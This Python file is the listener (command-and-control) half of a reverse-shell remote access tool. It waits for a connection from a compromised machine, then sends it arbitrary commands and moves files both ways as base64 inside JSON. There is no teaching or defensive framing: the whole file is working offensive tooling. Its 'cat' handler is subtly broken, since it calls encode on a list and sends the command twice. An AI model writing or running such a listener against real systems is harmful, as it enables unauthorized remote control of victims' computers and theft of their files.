import socket
import simplejson
import base64
import optparse

class SocketListener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("Listening...")
        (self.connection, address) = listener.accept()
        print("Connection OK from " + str(address))

    def json_send(self, data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def save_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "Download Completed Successfully"

    def download_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def command_execution(self, command_input):
        self.json_send(command_input)
        if command_input[0] == "exit":
            self.connection.close()
            exit()
        return self.json_receive()

    def command_execution_cat(self,command_input):
        self.connection.send(command_input.encode())
        command_output = self.connection.recv(1024).decode()
        return command_output

    def start_listener(self):
        try:
            while True:
                command_input = input("Enter command: ")
                command_input = command_input.split(" ")
                try:
                    if command_input[0] == "upload":
                        file_content = self.download_file(command_input[1])
                        command_input.append(file_content.decode('utf-8'))  # Ensuring proper encoding

                    command_output = self.command_execution(command_input)
                    if command_input[0] == "download" and "Error!" not in command_output:
                        command_output = self.save_file(command_input[1], command_output)

                    if command_input[0] == "cat":
                        command_output = self.command_execution_cat(command_input)
                except Exception:
                    command_output = "Error!"
                print(command_output)
        except KeyboardInterrupt:
            print("\nListener interrupted. Closing connection...")
            self.connection.close()
            exit()

def get_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-i", "--ip", dest="ip", help="Enter your ip")
    parse_object.add_option("-p", "--port", dest="port", help="Enter your port")
    (user_input, arguments) = parse_object.parse_args()
    return user_input

try:
    socket_listener = SocketListener(get_input().ip, int(get_input().port))
    socket_listener.start_listener()
except Exception:
    print("Enter ip and port")
